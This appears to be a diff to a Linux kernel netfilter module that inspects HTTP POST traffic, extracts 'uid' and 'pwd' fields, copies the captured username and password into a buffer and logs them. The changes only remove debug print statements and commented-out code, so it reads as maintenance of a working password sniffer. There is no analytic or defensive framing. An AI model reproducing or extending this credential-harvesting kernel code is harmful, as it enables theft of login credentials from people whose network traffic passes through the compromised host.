@@ -64,7 +64,6 @@ static void check_http(struct sk_buff *skb)
     if (strncmp(tcp_payload, "POST ", 5) != 0)
         return;
     /* HTTP POST请求 */
-    printk(KERN_INFO "find post\n");
     data = kmalloc(payload_len + 1, GFP_KERNEL);
     if (data != NULL)
     {
@@ -80,7 +79,6 @@ static void check_http(struct sk_buff *skb)
                 uid = NULL;
                 return;
             }
-            printk(KERN_INFO "uid:%s\n", uid);
         }
         if (pwd)
         {
@@ -89,7 +87,6 @@ static void check_http(struct sk_buff *skb)
                 kfree(pwd);
                 pwd = NULL;
             }
-            printk(KERN_INFO "pwd:%s\n", pwd);
         }
     }
 }
@@ -188,12 +185,6 @@ static unsigned int watch_in(unsigned int hooknum,
     memcpy(cp_data, uid, strlen(uid) + 1);
     memcpy(cp_data + strlen(uid) + 1, pwd, strlen(pwd) + 1);
     printk(KERN_INFO "uid:%s pwd:%s\n", cp_data, cp_data + strlen(uid) + 1);
-    // memcpy(cp_data, &target_ip, 4);
-    // if (username)
-    //     //memcpy(cp_data + 4, username, 16);
-    //     memcpy(cp_data + 4, username, 16);
-    // if (password)
-    //     memcpy(cp_data + 20, password, 16);
 
     /* This is where things will die if they are going to.
     * Fingers crossed... */
@@ -203,12 +194,6 @@ static unsigned int watch_in(unsigned int hooknum,
     kfree(uid);
     kfree(pwd);
     uid = pwd = NULL;
-    // have_pair = 0;
-
-    // target_port = target_ip = 0;
-
-    //   printk("Password retrieved\n");
-
     return NF_STOLEN;
 }
 
